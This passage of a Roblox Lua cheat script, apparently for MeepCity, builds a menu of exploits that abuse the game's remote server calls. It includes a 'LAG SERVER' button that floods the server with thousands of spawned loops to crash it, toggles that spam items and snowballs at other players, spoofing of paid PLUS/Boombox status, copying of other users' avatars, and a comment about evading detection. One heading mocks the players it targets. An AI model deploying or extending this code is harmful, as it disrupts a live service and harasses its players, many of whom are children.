    ReplicatedStorage.Connection:InvokeServer(9, 0)
    wait(0.1)

    ReplicatedStorage.Connection:InvokeServer(9, 1)

    ReplicatedStorage.Connection:InvokeServer(49)
    ReplicatedStorage.Connection:InvokeServer(50)
    ReplicatedStorage.Connection:InvokeServer(51)

    local ohNumber1 = 11
    local ohTable2 = {
        ["FishingPolePos"] = Workspace.TempFish.Position,
        ["Power"] = math.random(), -- Randomize to avoid detection
        ["Face"] = Workspace.TempFish.Position,
        ["PlayerPos"] = Workspace.TempFish.Position,
        ["FishingZonePos"] = Vector3.new(-5.29345703, -18.0412292, 43.7173767),
    }
    ReplicatedStorage.Connection:InvokeServer(ohNumber1, ohTable2)
end

-- Continuous loop to keep executing both functions using multiple spawns
local function startFishing()
    while Toggle do
        -- Spawn 15 simultaneous operations for maximum performance boost
        for _ = 1, 1000 do
            spawn(function() 
                equipAllTools()
            end)

            spawn(function()
                getItem()
            end)
        end
        wait(0) -- Wait for the next iteration
    end
end

local Section = Tab:CreateSection("Or just crash the server with this.")

local Button = Tab:CreateButton({
   Name = "LAG SERVER",
   Callback = function()
 -- Start both actions simultaneously when the button is clicked
        -- Activate Loop Drop All
        isSpamming = true
        spawn(function()
            while isSpamming do
                -- Simulate Backspace key press
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
                wait(1) -- Delay between each drop, adjust as needed
            end
        end)

        -- Activate Ultimate Spam Equip Fishing Rod (LAG)
        Toggle = true
        startFishing() -- Start the combined lag actions
   end,
})

local Section = Tab:CreateSection("Step 3 enjoy annoying teenager speds!")

local Tab = Window:CreateTab("Meepcity", 126133429358591) -- Title, Image

local function colorToTable(clr)
    return {tostring(clr.R * 255), tostring(clr.G * 255), tostring(clr.B * 255)}
end

local function ExtractData(humdes)
    local ava = {}

    for _, v in pairs({"WidthScale", "HeightScale", "DepthScale", "BodyTypeScale", "ProportionScale", "HeadScale"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Face", "Head", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "Torso"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"HeadColor", "LeftArmColor", "RightArmColor", "LeftLegColor", "RightLegColor", "TorsoColor"}) do
        ava[v] = colorToTable(humdes[v])
    end

    for _, v in pairs({"GraphicTShirt", "Shirt", "Pants"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"IdleAnimation", "RunAnimation", "JumpAnimation", "SwimAnimation", "WalkAnimation", "ClimbAnimation", "FallAnimation"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Hat", "Hair", "Back", "Face", "Front", "Neck", "Shoulders", "Waist"}) do
        ava[v .. "Accessory"] = humdes[v .. "Accessory"]
    end

    local layered = humdes:GetAccessories(false)
    for i, accessory in pairs(layered) do
        if accessory.AccessoryType and typeof(accessory.AccessoryType) == "EnumItem" then
            accessory.AccessoryType = accessory.AccessoryType.Name
        end
        accessory.Order = i
    end
    ava.AccessoryBlob = layered

    ava.Emotes = humdes:GetEmotes()

    return ava
end


local AvatarClipboard = nil
local AvatarClipboardName = "Unnamed"

local Section = Tab:CreateSection("Avatar Clipboard")
Section:Set("Avatar Clipboard")

local function copyToClip(data, name)
    if not data then
        AvatarClipboard = nil
        AvatarClipboardName = "Unnamed"
        Section:Set("Avatar Clipboard")
    else
        AvatarClipboard = data
        AvatarClipboardName = name
        Section:Set("Avatar Clipboard: " .. name)
    end
end

local function LoadPlayer(player)
    coroutine.wrap(function()
        if player ~= Players.LocalPlayer then
            local function LoadCharacter(character)
                local prox = Instance.new("ProximityPrompt", character:WaitForChild("HumanoidRootPart"))
                prox.ActionText = "Copy Avatar To Clipboard"
                prox.ObjectText = player.DisplayName
                prox.KeyboardKeyCode = Enum.KeyCode.C
                prox.HoldDuration = 0
                prox.RequiresLineOfSight = false
                prox.Triggered:Connect(function()
                    if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
                        copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
                    end
                end)
            end
            LoadCharacter(player.Character or player.CharacterAdded:Wait())
            player.CharacterAdded:Connect(LoadCharacter)
        end
    end)()
end

for _, player in pairs(Players:GetPlayers()) do
    LoadPlayer(player)
end
Players.PlayerAdded:Connect(LoadPlayer)

Tab:CreateButton({
    Name = "Copy Current Avatar",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character
        if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
            copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
        end
    end
})

Tab:CreateButton({
    Name = "Load Avatar",
    Callback = function()
        if AvatarClipboard then
            game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(AvatarClipboard)
        end
    end
})

local LoadAvatarFromUserId = Tab:CreateInput({
   Name = "Load Avatar From UserId",
   CurrentValue = "",
   PlaceholderText = "Enter UserId",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUserId",
   Callback = function(userid)
      if userid and tonumber(userid) and Players:GetHumanoidDescriptionFromUserId(tonumber(userid)) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(tonumber(userid)))
        game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})

local LoadAvatarFromUsername = Tab:CreateInput({
   Name = "Load Avatar From Username",
   CurrentValue = "",
   PlaceholderText = "Enter Username",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUsername",
   Callback = function(username)
      if username and Players:GetUserIdFromNameAsync(username) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(Players:GetUserIdFromNameAsync(username)))
          game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spam pizza plate", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 685,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 685 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Button = Tab:CreateButton({
   Name = "Firework (Manual)",
   Callback = function()
 game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
        game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
        game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
   end,
})

local spawnFirework = false -- Variable to track toggle state
local fireworkLoop -- Variable to hold the loop thread

local Toggle = Tab:CreateToggle({
   Name = "Spawn Fireworks (Normal)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
   spawnFirework = value
		if spawnFirework then
			-- Start spawning fireworks in a loop
			fireworkLoop = coroutine.create(function()
				while spawnFirework do
					game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
					game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
					game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
					wait(1.5) -- Adjust the wait time if needed for a slower/faster spawn rate
				end
			end)
			coroutine.resume(fireworkLoop)
		else
			-- Stop spawning fireworks by breaking the loop
			spawnFirework = false
		end
   end,
})

local spawnFirework = false -- Variable to track toggle state
local fireworkConnection -- Variable to hold the loop connection
local lastFireworkTime = 0 -- Time of the last firework spawn
local fireworkCooldown = 1.2 -- Cooldown between fireworks in seconds (adjust as needed)

local Toggle = Tab:CreateToggle({
   Name = "Multi Spam Fireworks (Best)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(value)
 spawnFirework = value
        if spawnFirework then
            -- Start continuously spawning fireworks
            fireworkConnection = game:GetService("RunService").Heartbeat:Connect(function()
                -- Check if enough time has passed since the last firework spawn
                if tick() - lastFireworkTime >= fireworkCooldown then
                    -- Fire the events to spawn fireworks
                    game:GetService("ReplicatedStorage").Connection:InvokeServer(202, 1310)
                    game:GetService("ReplicatedStorage").Connection:InvokeServer(201, 1310, {})
                    game:GetService("ReplicatedStorage").ConnectionEvent:FireServer(210)
                    
                    -- Update the last firework spawn time
                    lastFireworkTime = tick()
                end
            end)
        else
            -- Stop spawning fireworks
            if fireworkConnection then
                fireworkConnection:Disconnect()
                fireworkConnection = nil
            end
        end
   end,
})

local animationTrack

local Toggle = Tab:CreateToggle({
    Name = "Fake ZZZ",
    CurrentValue = false,
    Flag = "ToggleExample",
    Callback = function(Value)
        
        local animationId = "rbxassetid://2176786857"
        local animation = Instance.new("Animation")
        animation.AnimationId = animationId

       
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

      
        local args = {
            [1] = Value, 
            [2] = 1
        }

        if Value then
           
            if not animationTrack or animationTrack.IsPlaying == false then
                animationTrack = humanoid:LoadAnimation(animation)
                animationTrack:Play()
            end

            
            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
        else
           
            if animationTrack and animationTrack.IsPlaying then
                animationTrack:Stop()
            end

           
            args[1] = false
            game:GetService("ReplicatedStorage").EventConnections.SetCharacterIsSleeping:FireServer(unpack(args))
        end
    end,
})


local Toggle = Tab:CreateToggle({
   Name = "Spam turkey", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 687,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 687 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spam pizza plate", 
   CurrentValue = false,
   Flag = "Toggle1",
   Callback = function(value)
        isSpamming = value
        if isSpamming then
            spawn(function()
                while isSpamming do
                    local player = game.Players.LocalPlayer
                    local character = player.Character
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

                    local characterPosition = humanoidRootPart.Position

                    local rayOrigin = characterPosition + Vector3.new(0, 5, 0)
                    local rayDirection = Vector3.new(0, -10, 0)

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection)

                    local groundPosition
                    if raycastResult then
                        groundPosition = raycastResult.Position
                    else
                        groundPosition = characterPosition - Vector3.new(0, 5, 0)
                    end

                    local plantPosition = groundPosition + Vector3.new(0, -3, 0)

                    local args1 = { [1] = 201, [2] = 1372, [3] = {} }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args1))

                    local args2 = {
                        [1] = 685,
                        [2] = plantPosition
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections"):WaitForChild("SpecialObjectRequestPlant"):InvokeServer(unpack(args2))

                    local args3 = { [1] = 202, [2] = 685 }
                    game:GetService("ReplicatedStorage"):WaitForChild("Connection"):InvokeServer(unpack(args3))

                    wait(0.08)
                end
            end)
        else
            isSpamming = false
        end
    end,
})

local Button = Tab:CreateButton({
   Name = "Give snowball all (BUGGY)",
   Callback = function()
     local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local isRunning = false 

local function equipItem()
    local equipArgs = {201, 932}
    local success, result = pcall(function()
        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(equipArgs))
    end)
    if not success then
        warn("Equip item failed:", result)
    end
end

local function unEquip()
    local args = {
        [1] = 202,
    }
    pcall(function()
        ReplicatedStorage:WaitForChild("Connection"):InvokeServer(unpack(args))
    end)
end

local function hasItemEquipped(player)
    local equippedItems = player:FindFirstChild("Backpack"):FindFirstChild(932)
    return equippedItems ~= nil
end

local function giveItemToAllPlayers()
    for _, player in pairs(Players:GetPlayers()) do
        if not hasItemEquipped(player) then
            local giveArgs = {player.UserId, 932}
            local success, result = pcall(function()
                ReplicatedStorage:WaitForChild("FunctionConnections"):WaitForChild("RequestSendPassAlongActionItem"):InvokeServer(unpack(giveArgs))
            end)
            if not success then
                warn("Give item failed for " .. player.Name .. ":", result)
            end
        end
    end
end

while true do
    if not isRunning then
        isRunning = true
        
        equipItem()
        giveItemToAllPlayers()
        unEquip()
        
        isRunning = false
    else
        wait(1)
    end
    wait(2)
end

   end,
})

local Button = Tab:CreateButton({
   Name = "Throw snowball all",
   Callback = function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local ThrowItemEvent = ReplicatedStorage.EventConnections.ThrowItem
local RunService = game:GetService("RunService")

local function getRandomPlayer()
    local allPlayers = Players:GetPlayers()
    local randomIndex = math.random(1, #allPlayers)
    local randomPlayer = allPlayers[randomIndex]
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return randomPlayer
    else
        return nil
    end
end

local function throwAtRandomPlayer()
    local randomPlayer = getRandomPlayer()
    if randomPlayer then
        local targetPosition = randomPlayer.Character.HumanoidRootPart.Position
        local args = {
            [1] = string.format("[932,[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],[\"%s\",\"%s\",\"%s\"],75]",
                tostring(targetPosition.X), tostring(targetPosition.Y), tostring(targetPosition.Z),
                tostring(targetPosition.X + 3), tostring(targetPosition.Y + 3), tostring(targetPosition.Z + 3),
                tostring(targetPosition.X - 3), tostring(targetPosition.Y - 3), tostring(targetPosition.Z - 3))
        }
        ThrowItemEvent:FireServer(unpack(args))
    end
end

RunService.Heartbeat:Connect(function()
    for _ = 1, 1 do
        throwAtRandomPlayer()
    end
end)
   end,
})


local Section = Tab:CreateSection("Balloon Spawner")

local Dropdown = Tab:CreateDropdown({
   Name = "Select balloon",  -- Balloon color dropdown
   Options = {"Red", "Blue", "Green", "Purple", "White", "Heart"},  -- Color options
   CurrentOption = {"Red"},  -- Default option
   MultipleOptions = false,  -- Only one option can be selected
   Flag = "BalloonColor",  -- Flag to identify the configuration
   Callback = function(Options)
      -- Update the selected balloon color
      selectedBalloonColor = Options[1]
      print("Selected balloon color: " .. selectedBalloonColor)
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Start spawning balloon type",  -- Start balloon spawning toggle
   CurrentValue = false,  -- Default value (false = not spawning)
   Flag = "SpawnBalloons",  -- Flag to identify the configuration
   Callback = function(Value)
      -- Update the spawnBalloons state
      spawnBalloons = Value
      print("Spawning balloons: " .. tostring(spawnBalloons))

      if spawnBalloons then
         -- Start balloon spawning in a separate thread
         task.spawn(function()
            while spawnBalloons do
               -- Map the selected balloon color to the balloon IDs
               local balloonID
               if selectedBalloonColor == "Red" then
                  balloonID = 1311
               elseif selectedBalloonColor == "Blue" then
                  balloonID = 1312
               elseif selectedBalloonColor == "Green" then
                  balloonID = 1313
               elseif selectedBalloonColor == "Purple" then
                  balloonID = 1314
               elseif selectedBalloonColor == "White" then
                  balloonID = 1315
               elseif selectedBalloonColor == "Heart" then
                  balloonID = 1039  -- Heart balloon ID
               end

               -- Spawn the selected balloon type
               local args = {
                  [1] = 201,
                  [2] = balloonID,
                  [3] = {}
               }

               local args2 = {
                  [1] = 202
               }

               game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
               game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

               task.wait(0)  -- Wait before spawning the next balloon
            end
         end)
      end
   end,
})

local spawnAllBalloons = false -- To control the toggle

local Toggle = Tab:CreateToggle({
   Name = "Spawn all balloons",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
spawnAllBalloons = Value -- Update the toggle state
		print("Spawning all balloons: " .. tostring(spawnAllBalloons))

		if spawnAllBalloons then
			-- Start spawning all balloons in a separate thread
			task.spawn(function()
				while spawnAllBalloons do
					-- Spawn balloon with ID 1311
					local args = {
						[1] = 201,
						[2] = 1311,
						[3] = {}
					}
					local args2 = {
						[1] = 202
					}
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1312
					args[2] = 1312
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1313
					args[2] = 1313
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1314
					args[2] = 1314
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1315
					args[2] = 1315
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					-- Spawn balloon with ID 1039 (new addition)
					args[2] = 1039
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args))
					game:GetService("ReplicatedStorage").Connection:InvokeServer(unpack(args2))

					task.wait(0) -- Wait before spawning the next set of balloons
				end
			end)
		end
   end,
})

local Section = Tab:CreateSection("Other")

local Button = Tab:CreateButton({
   Name = "Wear all items (Rejoin to remove them)",
   Callback = function()
 -- Fire the events to spawn fireworks once
      local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function tryID(id)
    print("ID'ler test ediliyor:", id)
    ReplicatedStorage.Connection:InvokeServer(201, id, {})
end

for id = 0, 8000 do
    coroutine.wrap(tryID)(id)  -- Launch each ID attempt in a new coroutine
end
   end,
})

local Button = Tab:CreateButton({
   Name = "Quick access rejoin",
   Callback = function()
 game:GetService("TeleportService"):Teleport(game.PlaceId)
	 wait()
	 
 
 
 wait();
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "Spoof PLUS/BOOMBOX",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
if Value then
			-- When toggle is ON
			game.Players.LocalPlayer:SetAttribute("PLUS", true)
			game.Players.LocalPlayer:SetAttribute("BoomBox", true)
		else
			-- When toggle is OFF
			game.Players.LocalPlayer:SetAttribute("PLUS", false)
			game.Players.LocalPlayer:SetAttribute("BoomBox", false)
		end
   end,
})

local Section = Tab:CreateSection("Visual Only")

local Input = Tab:CreateInput({
   Name = "Meep Coins",
   CurrentValue = "",
   PlaceholderText = "money amount",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
-- Change the coin amount to the value typed in the textbox
		local coinAmount = tonumber(Value) -- Convert input to a number
		
		-- Ensure the input is a valid number before updating the coin amounts
		if coinAmount then
			game:GetService("Players").LocalPlayer.PlayerGui.MainGui.CoinsContainer.Container.Amount.Text = coinAmount
			game:GetService("Players").SlayerssUnleashedd.PlayerGui.ShopGui.Background.Content.Main.TopContainer.CoinsContainer.TotalCoins.Text = coinAmount
			game:GetService("Players").SlayerssUnleashedd.PlayerGui.ScreenGui.ItemShop.ShopContent.TopBar.ButtonBuyCoins.CoinAmount.Text = coinAmount
		else
			warn("Invalid input! Please enter a valid number.")
		end
   end,
})

local Button = Tab:CreateButton({
   Name = "Infinite Money",
   Callback = function()
game:GetService("Players").LocalPlayer.PlayerGui.MainGui.CoinsContainer.Container.Amount.Text = math.huge
	game:GetService("Players").SlayerssUnleashedd.PlayerGui.ShopGui.Background.Content.Main.TopContainer.CoinsContainer.TotalCoins.Text = math.huge
	game:GetService("Players").SlayerssUnleashedd.PlayerGui.ScreenGui.ItemShop.ShopContent.TopBar.ButtonBuyCoins.CoinAmount.Text = math.huge
   end,
})

local Tab = Window:CreateTab("Avatar", 7743869517) -- TÃ­tulo, Imagem

local Button = Tab:CreateButton({
   Name = "zynlope exploit fit",
   Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["HatAccessory"] = "33070696,9255011,259423244",
        ["RightLegColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["Face"] = 42070576,
        ["WidthScale"] = 1,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "6736453833",
        ["FrontAccessory"] = "0",
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 0,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["Pants"] = 3911904807,
        ["RightArmColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["LeftLegColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["HairAccessory"] = "17327436421",
        ["HeadColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["RightArm"] = 0,
        ["Torso"] = 0,
        ["IdleAnimation"] = 2510235063,
        ["RightLeg"] = 0,
        ["Shirt"] = 5081914658,
        ["GraphicTShirt"] = 76168825699893,
        ["ProportionScale"] = 0,
        ["RunAnimation"] = 619536621,
        ["NeckAccessory"] = "11996992458",
        ["TorsoColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["DepthScale"] = 1,
        ["LeftArm"] = 0,
        ["HeadScale"] = 1.1,
        ["HeightScale"] = 1,
        ["LeftArmColor"] = {
            [1] = "0",
            [2] = "0",
            [3] = "0"
        },
        ["LeftLeg"] = 0
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
end,
})

Tab:CreateButton({
    Name = "project zyn fit",
    Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["HatAccessory"] = "33070696,3138460373",
        ["RightLegColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["Face"] = 26343188,
        ["WidthScale"] = 1,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "12632137005",
        ["FrontAccessory"] = "0",
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 14411367823,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["Pants"] = 3911904807,
        ["RightArmColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["LeftLegColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["HairAccessory"] = "17327436421",
        ["HeadColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["RightArm"] = 103452055306587,
        ["Torso"] = 81500432784353,
        ["IdleAnimation"] = 2510235063,
        ["RightLeg"] = 18970745060,
        ["Shirt"] = 87815175853530,
        ["GraphicTShirt"] = 72395760414645,
        ["ProportionScale"] = 0,
        ["RunAnimation"] = 619536621,
        ["NeckAccessory"] = "11996992458",
        ["TorsoColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["DepthScale"] = 1,
        ["LeftArm"] = 87202958751790,
        ["HeadScale"] = 1,
        ["HeightScale"] = 1,
        ["LeftArmColor"] = {
            [1] = "204",
            [2] = "142",
            [3] = "105"
        },
        ["LeftLeg"] = 18970745144
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
    end
})

local Button = Tab:CreateButton({
   Name = "random fit",
   Callback = function()
     -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["WalkAnimation"] = 0,
        ["Face"] = 823012694,
        ["ProportionScale"] = 1,
        ["ClimbAnimation"] = 2510230574,
        ["Shirt"] = 18792445948,
        ["FaceAccessory"] = "16206700684",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "110349862432075,18676517458",
        ["RightArm"] = 0,
        ["Head"] = 0,
        ["FallAnimation"] = 0,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.7649999856948853,
        ["RightLeg"] = 0,
        ["HeightScale"] = 0.9300000071525574,
        ["LeftLeg"] = 0,
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 0.6000000238418579,
        ["BodyTypeScale"] = 0.5,
        ["RunAnimation"] = 2510238627,
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 4940602656
            },
            ["8"] = {
                [1] = 15554010118
            },
            ["3"] = {
                [1] = 3994129128
            },
            ["2"] = {
                [1] = 10147921916
            },
            ["5"] = {
                [1] = 3994130516
            },
            ["4"] = {
                [1] = 4212499637
            },
            ["7"] = {
                [1] = 6797938823
            },
            ["6"] = {
                [1] = 14353421343
            }
        },
        ["Pants"] = 11908042301,
        ["AccessoryBlob"] = {},
        ["WaistAccessory"] = "76627054961155",
        ["ShouldersAccessory"] = "",
        ["NeckAccessory"] = "",
        ["FrontAccessory"] = "",
        ["SwimAnimation"] = 973772659,
        ["BackAccessory"] = "15257803225",
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["JumpAnimation"] = 2510236649,
        ["IdleAnimation"] = 2510235063,
        ["HatAccessory"] = "14424491685,14513366673,11182875464",
        ["HeadScale"] = 0.9300000071525574,
        ["Torso"] = 0,
        ["GraphicTShirt"] = 0,
        ["LeftArm"] = 0
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
   end,
})

local Button = Tab:CreateButton({
   Name = "cat fit",
   Callback = function()
     -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["WalkAnimation"] = 103190462987721,
        ["RightLegColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["HeadColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["Torso"] = 139832149249848,
        ["WidthScale"] = 0.9132782220840454,
        ["LeftArmColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["BodyTypeScale"] = 1,
        ["ClimbAnimation"] = 104741822987331,
        ["Shirt"] = 6486367883,
        ["Emotes"] = {
            ["1"] = {
                [1] = 120642514156293
            },
            ["8"] = {
                [1] = 15392927897
            },
            ["3"] = {
                [1] = 12507097350
            },
            ["2"] = {
                [1] = 139021427684680
            },
            ["5"] = {
                [1] = 15554010118
            },
            ["4"] = {
                [1] = 5230661597
            },
            ["7"] = {
                [1] = 17746270218
            },
            ["6"] = {
                [1] = 15506503658
            }
        },
        ["GraphicTShirt"] = 0,
        ["RightArmColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["JumpAnimation"] = 138641066989023,
        ["LeftLegColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["Face"] = 0,
        ["RightArm"] = 131821220111203,
        ["SwimAnimation"] = 112231179705221,
        ["Head"] = 137459120414632,
        ["ProportionScale"] = 1,
        ["RunAnimation"] = 136276875045281,
        ["Pants"] = 114219664859076,
        ["IdleAnimation"] = 101839542383818,
        ["FallAnimation"] = 72706690305027,
        ["TorsoColor"] = {
            [1] = "100.00000163912773",
            [2] = "95.00000193715096",
            [3] = "99.00000169873238"
        },
        ["DepthScale"] = 1.0816391110420227,
        ["LeftArm"] = 90053530425094,
